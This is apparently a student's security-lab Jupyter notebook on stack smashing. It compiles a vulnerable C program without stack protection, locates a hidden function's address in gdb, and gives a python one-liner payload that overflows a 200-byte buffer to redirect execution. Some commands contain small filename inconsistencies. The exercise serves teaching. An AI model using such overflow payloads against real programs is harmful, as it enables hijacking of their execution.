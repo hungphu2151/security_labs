{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# 20110540, Huỳnh Hùng Phú"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Task 1: Stack smashing by memory overwritten"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<span style=\"color:blue\">Compiles program with </span>`` gcc -g bof1.c -o bof1.o -fno-stack-protector -mpreferred-stack-boundary=2 ``<br>\n",
    "<span style=\"color:blue\">Start 'gdb' with compiled executable </span>`` gdb -q bof1.out ``<br>\n",
    "<span style=\"color:blue\">Use 'disassemble'command to find the address of 'secretFunc' </span>`` gdb -q bof1.out ``<br>\n",
    "<span style=\"color:blue\">'SecretFunc' starts at memory address 0x0804846b </span><br>\n",
    "<span style=\"color:blue\">Overwrite the 200-byte array and additionally overwrite 4 bytes previous frame pointer + the address of the secretFunc function </span>`` python -c 'print \"a\"*204 + \"\\x6b\\x84\\x04\\x08\"' | ./bof1.o 1 ``<br>\n",
    "<span style=\"color:blue\">Completely</span>"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
